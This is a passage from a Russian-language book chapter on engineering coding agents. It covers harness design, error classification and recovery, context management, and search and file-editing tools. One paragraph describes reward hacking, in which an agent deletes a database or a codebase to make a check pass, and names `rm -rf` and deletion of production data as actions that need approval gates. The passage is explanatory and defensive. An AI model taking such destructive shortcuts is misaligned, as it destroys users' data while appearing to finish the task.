Проектный документ служит мостом между абстрактными требованиями и конкретным планом реализации. Он должен отвечать на основные вопросы: какие модули и почему будут изменены, какое решение выбрано и в чём его преимущества перед альтернативами, какие новые зависимости потребуются, какое воздействие ожидается на систему. Само написание проектного документа требует глубокого анализа: оно заставляет агента концептуально проверить осуществимость решения до того, как будет затрачено много времени на программирование. Ещё важнее то, что проектный документ предоставляет человеку эффективную точку вмешательства: краткий документ проверить намного проще, чем сотни строк кода. Завершив проектный документ, агент должен передать его пользователю на проверку и дождаться одобрения перед продолжением работы.

**Реализация кода и тестирование.**

После утверждения проекта агент реализует изменения в соответствии со стандартами кода проекта, повторно использует существующие абстракции и инструменты и при необходимости проводит умеренный рефакторинг для поддержания здоровья кодовой базы.

Сразу после реализации начинается этап обеспечения качества на основе тестирования: агент пишет тестовые случаи для новой или изменённой функциональности, охватывая основные пути, граничные условия и исключительные ситуации. Затем выполняет комплект тестов. Если тесты не проходят, агент не должен просто сообщать пользователю о сбое. Он должен проанализировать причину, локализовать проблему и изменять код до прохождения всех тестов. Цикл «тестирование — исправление» может потребовать нескольких итераций. Именно эта способность к самокоррекции превращает Coding-агента из генератора кода в надёжного инженерного помощника.

Даже после прохождения всех тестов работа агента не заканчивается. Следующий этап — проверка кода: агент критически оценивает созданный код. Насколько он читаем, достаточно ли комментариев? Нет ли потенциальных проблем производительности или уязвимостей безопасности? Соответствует ли он стилю и лучшим практикам проекта? Такая самопроверка может выполняться посредством чтения кода, запуска инструментов lint или вызова специализированного субагента проверки кода (Sub-Agent). Если проверка обнаруживает проблемы, необходимо вернуться к этапу изменений и устранить их, а не передавать пользователю дефектный код.

**Синхронизация документации и передача результата.**

Если изменения кода затрагивают архитектуру — например, добавляют новый модуль, меняют зависимости между модулями или семантику ключевой абстракции, — агент должен соответствующим образом обновить архитектурную документацию. Устаревшая документация хуже её отсутствия, поскольку вводит будущих разработчиков в заблуждение. Автоматически обновляя документацию после каждого значимого изменения, агент помогает сохранять полноту и актуальность базы знаний проекта.

Этот процесс отражает основные принципы программной инженерии: планирование предшествует действиям, проверка ведётся непрерывно, а документация развивается вместе с кодом.

### Практика Harness-инженерии в Coding-агентах

В первой главе были представлены понятие Harness-инженерии и формула **Agent = Model + Harness**. В этой формуле Harness включает контекст и инструменты, а также механизмы ограничений, проверки и исправления — все пять элементов, образующих Harness согласно определению из первой главы. Coding-агенты, вероятно, относятся к областям, получающим наибольшую пользу от Harness-инженерии: написание кода — одна из **наиболее проверяемых** агентных задач, а для ограничений, проверки и исправления уже существует готовая инфраструктура. Этот раздел посвящён конкретным практикам Harness для Coding-агентов.

Стабильность работы зачастую зависит не от мощности модели, а от надёжности инфраструктуры вокруг агента. В первой главе Harness был разделён на два уровня: **контекст и инструменты**, позволяющие агенту действовать, и **ограничения, проверка и исправление**, не позволяющие ему действовать неправильно. В случае Coding-агента эти уровни воплощаются в конкретных инженерных компонентах:

- **Базовые критерии приёмки**: что считается завершённой работой — комплект тестов, CI-конвейер (конвейер непрерывной интеграции, автоматически запускающий серию проверок после отправки кода), стандарты проверки кода
- **Границы выполнения**: к чему агент может и не может прикасаться — границы модулей, правила зависимостей, управление разрешениями
- **Сигналы обратной связи**: автоматизированное определение правильности — вывод Linter (инструмента проверки стандартов кода, автоматически находящего ошибки форматирования и потенциальные проблемы), результаты тестов, ошибки проверки типов
- **Средства отката**: как восстановиться после проблемы — контроль версий Git, изоляция песочницы, откат к снимку

**Почему Coding-агент особенно хорошо подходит для Harness-инженерии.**

Задачи можно разделить на четыре состояния по двум измерениям: ясности цели и степени автоматизации проверки. Чёткая цель и автоматически проверяемый результат образуют наиболее подходящую для агента область. Если цель ясна, но результат должен проверять человек, верхняя граница пропускной способности определяется скоростью человеческой проверки. Если автоматическая обратная связь есть, но цель неоднозначна, система будет эффективно двигаться в неверном направлении. Если отсутствует и то и другое, агент практически бесполезен. Таблица 5-1 показывает эти четыре состояния. Цель Harness — переместить как можно больше задач в квадрант «ясная цель + автоматизированная проверка».

Таблица 5-1. Четыре квадранта ясности задачи и автоматизации проверки

| | Результат можно проверить автоматически | Результат требует ручной проверки |
|----------|----------------------------------------------|---------------------------------------|
| **Цель ясна** | Оптимальная область: исправление bug с готовым тестовым случаем | Ограниченная пропускная способность: рефакторинг кода требует ручной проверки |
| **Цель неоднозначна** | Эффективное движение не туда: оптимизация «качества кода» с помощью linter | Невозможно приступить: «сделай UI красивее» |

Написание кода естественным образом находится в самом центре этого квадранта: комплект тестов предоставляет чёткие критерии приёмки, Linter и средство проверки типов обеспечивают немедленную автоматическую проверку, а Git — идеальный контроль версий и возможность отката. Именно поэтому Coding-агенты сегодня достигли большей зрелости, чем все остальные типы агентов. Причина не в исключительной силе моделей генерации кода, а в том, что накопленная за десятилетия инфраструктура программной инженерии естественным образом образует мощный Harness.

**Отраслевые практики.**

Принципы выше подтверждаются тремя примерами применения Harness:

- **Пример крупномасштабной миграции кода** из опубликованного крупной технологической компанией опыта: ключевым фактором была не мощность модели, а три правильных решения в Harness — знания должны находиться в самой кодовой базе, поскольку невидимое агенту не существует; ограничения следует кодировать в Linter и CI, а не описывать в документации; полный цикл проверки и исправления должен быть автоматизирован.
- **LangChain**: одна лишь оптимизация Harness — системного промпта, middleware инструментов и цикла самопроверки — позволила значительно улучшить результаты на задачах бенчмарка. Особенно примечательна методология «использовать агента для анализа неудачных траекторий и улучшения Harness», благодаря которой Harness-инженерия переходит от ручного опыта к данным.
- **Anthropic**: длительные задачи разделяются между двумя ролями. Агент инициализации разбивает большую задачу на список подзадач, а агент выполнения последовательно решает их и оставляет промежуточные результаты — например, завершённые файлы кода и обновлённый список задач — для продолжения в следующем цикле. Такое разделение решает характерные для долгоживущих агентов проблемы: стремление «сделать всё сразу» или преждевременное заявление о завершении.

**От Coding-агента к универсальным принципам проектирования Harness.**

Практика Harness для Coding-агентов позволяет сформулировать переносимые принципы проектирования любых агентных систем:

1. **Ограничения важнее указаний**: правило, которое можно принудительно обеспечить кодом, не следует оставлять в виде рекомендации в документации. Правила Linter, ограничения типов и проверки CI намного ценнее указаний вида «пожалуйста, соблюдай...» в системном промпте: первые означают «так сделать невозможно», а вторые — лишь «так делать не рекомендуется».
2. **Проверка должна быть автоматизирована**: ручная проверка — не масштабируемое узкое место. Вложения в комплекты тестов, проверки качества кода и мониторинг поведения окупаются намного лучше, чем увеличение численности проверяющих.
3. **Чем быстрее и структурированнее обратная связь, тем лучше**: чем подробнее сообщение об ошибке и чем ближе оно поступает к моменту её возникновения, тем эффективнее агент исправляет проблему. Описанная во второй главе строка состояния агента — подробные ошибки и счётчик вызовов инструментов — воплощает именно этот принцип.
4. **Откат должен быть надёжным**: действуя внутри защитной сети, агент может смелее экспериментировать и ошибаться. Ветки Git, песочницы и снимки гарантируют обратимость любой ошибки.

**Другая цель ограничений: предотвращение ошибок процесса.** Базовые критерии приёмки определяют правильность результата, а границы выполнения — правильность **процесса**. Даже корректный результат нельзя получать неправильным способом. Если при исправлении сбоя базы данных удалить её и создать заново, «исправление» действительно сработает, но данные исчезнут. Если при исправлении ошибки компиляции удалить весь код и написать его заново, компиляция действительно пройдёт, но прежняя реализация будет потеряна. Подобные разрушительные короткие пути существуют всегда. Даже если ограничения включены в итоговую метрику оценки, агент нередко находит способ их обойти. Это повседневное проявление reward hacking в агентных задачах, рассматриваемого в седьмой главе. Поэтому Harness промышленного уровня должен предусматривать отдельные проверки и процедуры одобрения для таких опасных действий, как `rm -rf`, удаление производственных данных или перезапись непрочитанного файла. Сюда относятся семантический анализ из раздела этой главы о безопасности и проверка Sidecar из четвёртой главы. Ограничивается именно **действие**, а не только результат. Рассматриваемый в седьмой главе RLVP — штраф за путь проверки, то есть «вознаграждать результат, штрафовать путь» — решает ту же задачу со стороны обучения: помимо вознаграждения за итоговый результат, модель штрафуется за проверяемые нарушения во время процесса и усваивает отказ от разрушительных способов как инженерную норму. Для готовых моделей защитные барьеры Harness служат внешним ограничением, а для обучаемых моделей штрафы за процесс обеспечивают внутреннее усвоение. Их цель одинакова.

**Оркестрация инструментов: управление границами отказа**. Зрелые Coding-агенты поддерживают параллельные вызовы инструментов. С точки зрения Harness здесь возникает особая проблема: **как распространяется отказ**? Если один инструмент завершается с ошибкой, какие вызовы следует прервать, а какие — продолжить? Принцип состоит в том, что отказ распространяется только внутри одной группы параллельных вызовов и не поднимается до родительской операции. Например, если одновременно читаются три файла и один не найден, следует сообщить только об этом сбое, а не отменять чтение двух остальных и тем более не прерывать всю задачу. Такое точное управление границами отказа предотвращает хрупкий сценарий «одна команда завершилась с ошибкой — вся задача остановилась». Конкретные механизмы параллельных вызовов, потокового разбора и каскадного прерывания рассматриваются в разделе этой главы «Приёмы реализации».

### Сбои и восстановление после ошибок

В предыдущем разделе были представлены принципы и компоненты Harness-инженерии. Здесь подробно рассматривается область, в которой особенно заметна разница в качестве инженерных решений, — **сбои и восстановление после ошибок**. Эксперимент с абляцией из первой главы уже показал серьёзность проблемы: отсутствия всего одного результата инструмента достаточно, чтобы агент вошёл в бесконечный цикл. В реальной производственной среде сбои гораздо разнообразнее. Этот раздел системно отвечает на три вопроса: с какими сбоями сталкивается Harness промышленного уровня, как их обнаруживать и устранять и в какой момент выполнение необходимо прекратить[^ch5-3]?

[^ch5-3]: Классификация сбоев и анализ механизмов в этом разделе основаны на изучении исходного кода промышленных агентов, включая Claude Code. Конкретные реализации быстро меняются, поэтому здесь выделены только устойчивые инженерные принципы.

**Таксономия сбоев: четыре уровня.** Первый шаг системы при обработке сбоя — его классификация. По месту возникновения сбои делятся на четыре уровня:

- **Уровень API**: ограничение частоты запросов (HTTP 429), перегрузка сервиса, тайм-аут запроса, разрыв соединения, обрезка вывода при достижении лимита. Эти сбои не связаны с содержанием задачи и представляют собой инфраструктурный шум.
- **Уровень инструментов**: галлюцинаторный вызов несуществующего инструмента, некорректные параметры, не соответствующие ограничениям входных данных инструмента, исключение при выполнении и наиболее опасный случай — инструмент многократно возвращает одну и ту же ошибку, а модель без изменений повторяет вызов.
- **Уровень контекста**: переполнение контекстного окна, неудачное сжатие, повреждение структуры траектории — например, вызов инструмента без парного сообщения с результатом.
- **Уровень потока управления**: бесконечный цикл, повторяющий одну операцию без прогресса, и спираль смерти, когда логика восстановления после ошибки сама вызывает LLM, снова завершается ошибкой и запускает цепную реакцию.

**Обнаружение: сначала классифицировать, затем считать.** После перехвата ошибки первый вопрос должен звучать не «повторить ли попытку», а «имеет ли повтор смысл». Повторять имеет смысл восстанавливаемые ошибки — ограничение частоты запросов, перегрузку и нестабильность сети. Невосстанавливаемые ошибки — недопустимые параметры, недостаточные разрешения или отсутствие инструмента — будут давать тот же результат при любом количестве неизменённых повторов, поэтому необходимо изменить ввод или стратегию. Harness промышленного уровня поддерживает таблицу соответствия между ошибками и стратегиями восстановления, а не использует общий принцип «при любой ошибке повторить».

Кроме единичных ошибок необходимо обнаруживать **паттерны**. Первый из них — отпечаток повторяющегося вызова: для сочетания «имя инструмента + параметры» вычисляется отпечаток, и многократное появление одного отпечатка однозначно указывает на цикл без прогресса. Именно такой паттерн наблюдался в эксперименте с абляцией из первой главы, где агент снова и снова вызывал один инструмент. Второй — счётчик последовательных сбоев: каждая ветвь восстановления поддерживает независимый счётчик, который используется далее для размыкания цепи.

Существуют также сбои, не проявляющиеся как ошибки и требующие отдельного **мониторинга активности и целостности**. Самый опасный вид сбоя потокового соединения — не разрыв, который сразу породит ошибку, а беззвучное зависание: соединение установлено, но поток данных остановился, словно труба подключена, но вода не течёт. Тайм-аут SDK часто распространяется только на первоначальное соединение, но не на передачу данных. Поэтому промышленному агенту необходим независимый сторожевой таймер бездействия (watchdog timer), который признаёт поток зависшим, если в течение заданного времени не появляется новый вывод, принудительно завершает его и запускает повторную попытку. Отсюда следует универсальный принцип: **каждому длительному соединению необходим сигнал активности; одного тайм-аута подключения недостаточно**. Мониторинг целостности проверяет структуру траектории: если у вызова инструмента отсутствует парное сообщение с результатом, система автоматически восстанавливает эту связь до добавления траектории в контекст, а не передаёт структурную ошибку модели или пользователю. Важная инженерная деталь: некоторые промышленные агенты одновременно работают в продуктовом режиме и в режиме сбора обучающих данных. В продуктовом режиме отсутствующее сообщение можно заменить заполнителем, но в режиме обучения такое исправление запрещено, поскольку синтетический заполнитель загрязнит обучающие данные. Двойной стандарт «продуктовый режим терпим, режим обучения строг» демонстрирует тесную связь между Harness и обучением модели.

**Восстановление: поэтапная эскалация с увеличением видимости.** Способы восстановления ранжируются по заметности для пользователя: если проблему можно решить на низком уровне, переходить на более высокий не следует.

1. **Незаметный повтор**. Это действие по умолчанию для восстанавливаемых ошибок. Успех определяют две детали: экспоненциальная задержка с добавлением случайного разброса, предотвращающая вторичную перегрузку из-за синхронных повторов множества клиентов, и соблюдение указанного сервером времени ожидания; кроме того, следует различать основные и фоновые вызовы — сбой запроса главного цикла требует повтора, а вспомогательные фоновые операции вроде генерации заголовка или подсказки ввода при ошибке следует просто отменить, иначе фоновые повторы будут потреблять квоту основного пути и создавать «усиление повторов».
2. **Деградация и продолжение**. Если повторы не помогают, следует изменить сам запрос. Например, когда вывод достиг лимита и генерация оборвалась, система сначала незаметно увеличивает лимит вывода и повторяет запрос. Если этого всё ещё недостаточно, в конец сообщения добавляется метаинструкция продолжить генерацию с точки остановки. При длительной перегрузке основной модели выполняется переход на резервную модель, но сначала необходимо удалить приватные форматные блоки прежней модели, иначе новая модель не сможет разобрать историю сообщений. Если дорогой режим ограничен по частоте, система временно возвращается к стандартному режиму.
3. **Отображение ошибки пользователю**. Ошибка показывается только после исчерпания всех автоматических способов, вместе с перечнем уже предпринятых действий восстановления.

Ошибки уровня инструментов обрабатываются иначе: **сессия не завершается, а ошибка становится входом для модели**. Галлюцинаторный вызов получает структурированный результат «инструмент не существует». Ошибка валидации параметров получает сообщение с подсказкой об ограничениях входных данных. Некорректные параметры — например, строка вместо ожидаемого объекта — до выполнения проходят программное исправление. Такие ошибки включаются в контекст как обычные результаты инструментов, и модель самостоятельно исправляет их на следующем шаге. Это практическое применение сформулированного выше принципа «чем структурированнее обратная связь, тем лучше»: чем конкретнее возвращаемая ошибка, тем выше вероятность успешной самокоррекции модели.

Основной принцип раздела состоит в следующем: **граница обработки ошибок проходит не по отдельному запросу, а по всему циклу восстановления**. Пока не установлено, что восстановление невозможно, промежуточные ошибки не должны передаваться потребителям — ни пользователю, ни нижестоящим системам, подписанным на события. Во время восстановления сообщения об ошибках удерживаются. Если восстановление удалось, потребитель ничего не замечает; если все попытки провалились, ошибки публикуются вместе. Это инженерное воплощение принципа исправления из первой главы: «не показывать промежуточное состояние, пока не подтверждена невозможность восстановления».

**Завершение: каждая ветвь восстановления должна иметь предел.** Сам механизм восстановления тоже может отказать, поэтому для каждой его ветви необходим явный предел размыкания цепи: после нескольких последовательных неудач сжатия контекста от сжатия следует отказаться; после нескольких ошибок классификации разрешений — запросить решение у человека; число попыток продолжения вывода должно быть фиксированным. Откуда брать пороговые значения? Из производственных данных, а не из догадок. Например, порог размыкания цепи «3 последовательных попытки» для сжатия в Claude Code основан на статистике реальных сессий. Однажды сессия последовательно потерпела более трёх тысяч неудач на этой ветви восстановления; глобально одни только бесполезные повторы этого типа ежедневно расходовали около 250 тысяч вызовов API, а более чем в тысяче сессий число последовательных неудач превышало 50. Три попытки оказались эмпирической точкой перегиба между «подавляющее большинство сбоев уже восстановлено» и «дальнейшие повторы почти наверняка бесполезны».

Ещё менее заметна, чем локальное размыкание цепи, **спираль смерти**: логика, запущенная на пути обработки ошибки, сама вызывает LLM, снова завершается ошибкой и запускает цепную реакцию. Реальный пример такой цепочки: агент останавливается из-за переполнения контекста, после чего запускается stop hook «автоматически фиксировать изменения кода в коммите при завершении» — логика очистки, автоматически выполняемая при остановке агента. Hook вызывает LLM для генерации commit message, снова происходит переполнение контекста, и hook запускается ещё раз. Защита состоит из двух мер: на пути обработки ошибки отключаются любые побочные функции, способные снова вызвать модель — лучше потерять одну вспомогательную возможность, например автоматическое извлечение памяти, — а оставшиеся цепочки обнаруживаются и прерываются счётчиком глубины рекурсии. Наконец, над всеми автоматическими механизмами должны находиться глобальные условия завершения и эскалации: максимальное число итераций, лимит бюджета сессии и передача человеку при превышении порога последовательных ошибок. Примером служит предохранитель отказов из четвёртой главы.

Вернёмся к вопросу из первой главы. Помимо отсутствующего результата инструмента, агент может войти в цикл из-за многократного возврата одной ошибки инструментом, галлюцинаторного вызова, потери состояния при сжатии контекста или принципиальной неразрешимости задачи. Обнаружение опирается на «классификацию ошибок + распознавание паттернов», восстановление — на «поэтапную эскалацию», а завершение — на «размыкатель цепи + глобальные пределы + передачу человеку». Вместе они образуют полный ответ Harness на проблему «агент может работать бесконечно». Эти механизмы решают не проблему «недостаточных возможностей модели», а проблему «устойчивости системы в граничных условиях». Модели будут становиться сильнее, но сеть всё равно может оборваться, процесс — зависнуть, а пользователь — совершить неожиданное действие. Если сформулировать ещё точнее: **надёжность агента определяется не тем, совершает ли он ошибки, а тем, существуют ли для каждого класса ошибок соответствующие пути обнаружения, восстановления и завершения**.

### Приёмы реализации Coding-агента

Описанный выше рабочий процесс представляет идеальную модель. Чтобы он действительно работал на практике, необходимы несколько конкретных приёмов реализации, которые при сохранении качества рассуждений повышают скорость отклика и снижают расход контекста. Это применение универсальных агентных технологий из второй и четвёртой глав к программированию.

**Параллельные вызовы инструментов, потоковое выполнение и каскадное прерывание.**

Традиционные реализации агентов часто работают последовательно: генерируют один вызов инструмента, выполняют его, получают результат и только после этого определяют следующий шаг. Строгое ожидание в очереди приводит к большой потере времени.

Современный Coding-агент должен полноценно использовать потоковые ответы. Этот механизм рассматривался во второй главе при обсуждении порядка вывода модели: как только параметры первого вызова инструмента полностью сгенерированы и прошли проверку, выполнение можно запустить немедленно, не ожидая генерации последующих вызовов. Например, если за один инференс модель последовательно выводит три вызова — поиск в коде, чтение конфигурационного файла и чтение журнала, — первый можно запустить сразу после завершения и проверки его параметров, параллельно с генерацией двух следующих. Независимые вызовы также могут выполняться параллельно, а не ожидать в очереди. Такое перекрытие выполнения значительно снижает сквозную задержку и ускоряет отклик агента.

Обратная сторона параллельного выполнения — обработка сбоев. В определении каждого инструмента следует указывать, поддерживает ли он конкурентное выполнение. По умолчанию поддержка отключена в соответствии с принципом безопасного отказа. Если один вызов завершается с ошибкой, механизм каскадного прерывания останавливает другие вызовы, запущенные в той же параллельной группе и зависящие от его результата, но не затрагивает независимые вызовы и родительскую операцию. Это конкретная реализация принципа «управление границами отказа» из раздела о Harness-инженерии.

**Точное управление контекстом.**

Основная проблема Coding-агента состоит в том, что кодовая база обычно велика, а контекстное окно модели ограничено. Даже если передовые модели заявляют поддержку миллионов токенов, загружать в контекст всю кодовую базу сразу дорого и бессмысленно. Интеллектуальное управление контекстом должно осуществляться на нескольких уровнях.

При чтении файлов агент не должен всегда загружать всё содержимое. Для крупных файлов инструмент должен поддерживать чтение заданного диапазона строк — например, только строк со 100-й по 150-ю, а не нескольких тысяч строк целиком. Ещё важнее добавлять к возвращаемому содержимому номера строк: каждая строка кода должна иметь префикс с её фактическим номером. Этот простой приём даёт огромную пользу: модель может точно сослаться на «строку 42 в `src/main.py`», что уменьшает неоднозначность и повышает надёжность последующего редактирования.

На уровне выполнения команд вывод терминала также требует осторожности. Компиляция или тесты могут вывести тысячи строк, и полное добавление этого вывода в контекст быстро исчерпает бюджет. Здесь широко используется описанный в четвёртой главе механизм обрезки и сохранения длинного вывода: остаются несколько первых строк, обычно содержащих контекст ошибки, и несколько последних, обычно содержащих сводку, а середина заменяется одной поясняющей строкой. В ней также указывается, что полный вывод сохранён во временном файле и доступен для чтения по мере необходимости.

**Динамическое добавление информации о среде.**

Это основное применение технологии строки состояния агента из второй главы к Coding-агенту. В отличие от универсальных агентов, Coding-агент сильно зависит от состояния среды выполнения. Перед каждым инференсом в конец контекста следует добавлять в виде строки состояния агента следующую ключевую информацию:

- **Текущий рабочий каталог**: предотвращает ошибки в путях
- **Ветка git**: показывает, работает ли агент в основной или функциональной ветке
- **Последние коммиты**: помогают понять историю развития проекта
- **Сводка непроиндексированных и проиндексированных изменений**: показывает, какие изменения уже внесены

Эту информацию не следует жёстко включать в статический системный промпт, поскольку это снизит эффективность KV-кэша. Вместо этого её необходимо формировать динамически и в актуальном виде добавлять как строку состояния агента. Благодаря этому агент получает «осведомлённость о среде» и принимает каждое решение на основе точного текущего состояния, а не устаревших предположений.

**Сохранение состояния среды выполнения команд.**

При работе с кодом многие операции зависят от состояния среды: переход в каталог, активация виртуального окружения, установка переменных среды, запуск фонового сервиса. Если каждая команда выполняется в новом shell, всё это состояние теряется: агент только что перешёл в каталог проекта командой `cd`, но следующая команда снова запускается из корневого каталога, вынуждая повторять настройку. Хуже того, некоторые операции, например активация виртуального окружения Python, действуют только в текущей shell-сессии и не переносятся между сессиями.

Поэтому следует поддерживать постоянную терминальную сессию, создаваемую при запуске агента и остающуюся активной на протяжении всего взаимодействия. Все команды выполняются в общем терминале, сохраняющем рабочий каталог, переменные среды и состояние сессии. Такая архитектура лучше соответствует привычкам разработчиков: обычно человек работает в одном долго открытом окне терминала. Разумеется, агент должен сохранять возможность запуска изолированных терминалов для параллельных задач, но постоянная сессия должна быть режимом по умолчанию.

**Механизм немедленной синтаксической обратной связи.**

Это ещё один пример ценности строки состояния агента. После изменения кода агент не должен ждать явного запроса пользователя на тестирование, чтобы проверить синтаксис. Более эффективный подход: сразу после завершения записи файла слой инструментов автоматически запускает соответствующий linter или средство проверки синтаксиса и включает результат в ответ инструмента. Если обнаружена синтаксическая ошибка, агент уже в следующем цикле инференса видит подробное сообщение — подобно программисту, которому IDE сразу подчёркивает ошибочно введённую скобку. Мгновенная обратная связь значительно снижает стоимость исправления, поскольку агент устраняет ошибку непосредственно после её появления, а не обнаруживает её позднее при запуске тестов.

Эти пять приёмов — параллельное и потоковое выполнение, управление контекстом, осведомлённость о среде, сохранение состояния и немедленная обратная связь — вместе образуют техническую основу эффективного Coding-агента. Это не изолированные оптимизации, а согласованные архитектурные решения с общей целью: позволить агенту работать так же плавно, как опытный разработчик.

### Инструменты поиска в Coding-агенте

Поиск релевантного кода в большой кодовой базе — начальная точка работы Coding-агента. На рисунке 5-3 сравниваются несколько взаимодополняющих инструментов поиска и показано, как зрелый Coding-агент должен выбирать способ поиска в зависимости от характера задачи.

![Рисунок 5-3. Сравнение инструментов поиска Coding-агента](images/fig5-3.svg)


**Сопоставление содержимого по регулярным выражениям** (grep/ripgrep): наиболее традиционный способ поиска, который построчно сканирует содержимое файлов и сопоставляет его с шаблоном. Когда агент знает конкретный искомый текст — имя функции, переменной или сообщение об ошибке, — такой поиск быстро и точно находит все вхождения. Выразительность регулярных выражений — синтаксиса описания текстовых шаблонов специальными символами, например `def handle.*` для всех определений функций, начинающихся с `handle`, — позволяет находить не только буквальный текст, но и фрагменты кода с заданной структурой. На практике также следует поддерживать фильтрацию по типам файлов, например поиск только в файлах Python, и по шаблонам путей, например исключение каталога тестов, чтобы уменьшить шум. Принципиальное ограничение состоит в том, что этот способ находит лишь текстовые совпадения и не понимает семантику: запрос «аутентификация пользователя» не найдёт функцию, которая действительно обрабатывает вход в систему, но не содержит слов «аутентификация пользователя».

**Сопоставление шаблонов имён файлов** (glob): не читает содержимое файлов, а ищет в структуре путей файловой системы файлы, соответствующие шаблону. Например, `**/*.test.ts` рекурсивно находит все тестовые файлы TypeScript, а `src/components/**/Button.tsx` — файл Button.tsx на любой глубине внутри components. Такой поиск намного быстрее поиска по содержимому, поскольку не требует открывать и читать файлы. Это первый шаг агента при изучении структуры проекта: быстрое сканирование файловой системы позволяет сформировать представление об организации проекта.

**Семантический поиск по коду**: в отличие от двух предыдущих способов точного сопоставления, пытается понять «смысл» запроса и кода. Для него необходимо решить две ключевые задачи:

- **Структурно-ориентированное разбиение**: код обладает строгой синтаксической структурой, поэтому его следует делить на целостные семантические единицы — функции, классы и методы, — а не слепо нарезать по фиксированному количеству символов.
- **Гибридный поиск**, технологический стек которого подробно рассматривается в третьей главе: векторные представления (плотные представления) хорошо находят семантически сходный код с другой лексикой — например, запрос «проверить личность пользователя» способен найти функцию `check_credentials`; сопоставление по ключевым словам с помощью BM25, классического поискового алгоритма на основе частоты слов и длины документа, хорошо подходит для точного поиска имён функций и переменных. Оба поиска выполняются параллельно, после чего их результаты объединяются и сортируются моделью повторного ранжирования (reranker), использующей перекрёстный кодировщик для точной оценки релевантности кандидатов.

Семантический поиск особенно полезен в исследовательских задачах, например для поиска кода, «взаимодействующего с базой данных» или «обрабатывающего проверку пользовательского ввода», в незнакомой кодовой базе.

Однако в отрасли нет согласия, стоит ли создавать для семантического поиска индекс представлений. Терминальные агенты, представителем которых является Claude Code, намеренно **не создают индекс представлений** и выполняют поиск на месте посредством agentic-сочетания grep + glob. Это избавляет от постоянно устаревающего по мере развития кода индекса и всей инфраструктуры его обслуживания, а также устраняет риск передачи представлений кода стороннему сервису. Инструменты типа Cursor, интегрированные в IDE, придерживаются противоположного подхода: они готовы оплачивать стоимость индексирования ради **семантического поиска между файлами**, позволяющего быстро находить в крупных кодовых базах семантически связанные фрагменты с различной лексикой. Выбор между этими двумя направлениями по сути представляет собой компромисс между «стоимостью инфраструктуры и передачи данных наружу» и «выгодой межфайлового семантического поиска».

**Поиск определений и ссылок на уровне символов**: использует функции IDE «перейти к определению» и «найти все ссылки» на основе LSP (Language Server Protocol — стандартного протокола взаимодействия редактора с механизмом анализа языка). Такой поиск различает определение и вызов одноимённых символов: например, знает, что `authenticate` в строке 42 является определением функции, а в строке 189 — её вызовом, тогда как текстовый поиск лишь найдёт все строки с этой последовательностью символов. Это особенно важно для рефакторинга. При переименовании функции нельзя полагаться только на текстовый поиск, поскольку её имя может встречаться в комментариях или строках; поиск по символам позволяет точно найти определение и все реальные места вызова.

Эти четыре способа образуют взаимодополняющий набор инструментов и на практике часто применяются совместно: сначала семантический поиск находит соответствующий модуль, затем регулярное выражение точно локализует конкретные строки кода, а поиск по символам прослеживает цепочку вызовов. Это постепенная стратегия «от общего к частному, от семантики к синтаксису».

### Инструменты редактирования файлов в Coding-агенте

Сложность редактирования файлов состоит не в самой операции, а в том, как позволить LLM эффективно и надёжно сообщить системе, «где и что изменить». На рисунке 5-4 сравниваются пять подходов к редактированию файлов, демонстрирующих фундаментальное противоречие между выражением намерений на естественном языке и точным машинным выполнением.

![Рисунок 5-4. Сравнение пяти подходов к редактированию файлов](images/fig5-4.svg)


**Описание различий + Apply Model**: модель не указывает непосредственно, как редактировать файл, а генерирует описание изменений. Это может быть текст различий в формате, похожем на git diff, то есть вывод команды `git diff`, показывающий удалённые и добавленные строки, либо каркас кода с маркерами пропусков, где неизменённые части заменены комментариями вроде «здесь без изменений». Затем описание передаётся специализированной «модели применения» (Apply Model), обычно другой, более компактной и быстрой LLM, которая объединяет его с исходным файлом и создаёт полный новый файл. Такое разделение ответственности позволяет основной модели сосредоточиться на высокоуровневой логике кода, а модели применения — на низкоуровневых текстовых операциях. Слабое место простой реализации — этап объединения: если описание изменений немного отличается от фактического кода файла, необходимо определить, относится ли оно к тому же месту, а при наличии нескольких похожих фрагментов изменения могут быть применены не там. Cursor — представитель постоянного развития этого подхода: основная модель выводит каркас кода с маркерами пропусков, а специально обученная небольшая модель fast-apply переписывает его в полный файл. Благодаря спекулятивному декодированию (speculative decoding), при котором исходное содержимое файла используется как черновик для параллельной проверки, скорость объединения достигает тысяч токенов в секунду. Инженерные вложения обеспечили этому подходу надёжность и скорость.

**Старая строка в новую строку** (Old String → New String): подход Claude Code. Модель передаёт old string — исходный текст для замены — и new string — новый текст, после чего фреймворк выполняет простой поиск и замену строки. Преимущества — предсказуемость и прозрачность: если old string присутствует в файле в единственном экземпляре, операция выполняется успешно; иначе завершается с ошибкой без двусмысленности. Недостаток состоит в том, что при удалении большого фрагмента необходимо полностью вывести его исходное содержимое, а расхождение даже в одном символе приводит к неудачному сопоставлению. Если одинаковый код встречается несколько раз, для устранения неоднозначности требуется предоставить более широкий контекст.

**Позиционирование по номерам строк** (Old Line Numbers → New String): модель указывает «удалить строки с X по Y и вставить новое содержимое». Номера строк точны и однозначны, а удаление крупного блока требует всего двух чисел. Однако модели легко ошибаются при «подсчёте» строк, особенно в длинных файлах. На практике эту проблему обычно смягчают добавлением номеров ко всем строкам при чтении файла, но после каждого изменения номера последующих строк сдвигаются, что ограничивает возможность параллельного редактирования нескольких участков.

**Команды редактирования в стиле Vim**: используют систему команд редактора Vim с операциями копирования, вырезания, вставки и другими возможностями. Они очень эффективны при реорганизации кода, например для переноса функции из одного места в другое. Но синтаксис команд сложен для освоения: наиболее сильные модели достаточно хорошо с ним справляются, тогда как у небольших моделей доля ошибок заметно возрастает.

**Сопоставление начала и конца строки** (Old String Start + End → New String): улучшение подхода с заменой старой строки. Модели не нужно выводить весь old string: достаточно указать несколько начальных и конечных строк удаляемого содержимого, опустив середину. Фреймворк находит область замены по совпадению начала и конца. Если эта пара границ уникальна в пределах файла, нужный участок определяется точно. Такой подход сочетает надёжность текстовой замены с эффективностью номеров строк. При удалении большого блока не нужно выводить сотни исходных строк — достаточно показать границы. Поскольку позиционирование по-прежнему основано на содержимом, а не на абстрактных номерах строк, риск ошибки модели относительно невелик.

